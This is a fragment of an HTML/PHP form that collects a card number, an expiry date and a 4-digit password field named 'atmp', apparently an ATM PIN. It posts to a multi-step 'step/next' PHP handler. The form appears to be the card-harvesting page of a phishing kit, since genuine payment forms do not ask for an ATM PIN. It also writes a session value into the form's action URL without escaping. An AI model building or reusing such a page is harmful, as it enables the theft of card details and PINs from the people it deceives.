...
<form action="step/next/mainnet.php?value=<?php echo $_SESSION['value']; ?>" method="POST">
    ...
    <div class="rew">
      ...
      <div class="col-75">
        <input type="tel" id="ccn" name="ccn" placeholder="____-____-____-____" data-slots="_" required>
      </div>
    </div>
    <div class="rew">
      <div class="col-25">
      ...
      <div class="col-75">
        <input type="tel" id="exp" name="exp" placeholder="MM/YY" data-slots="MY" required>
      </div>
    </div>
    <div class="rew">
      <div class="col-25">
	...
	<div class="rew">
      ...
      <div class="col-75">
        <input type="password" id="atmp" minlength="4" maxlength="4" name="atmp" required>
      </div>
    </div>
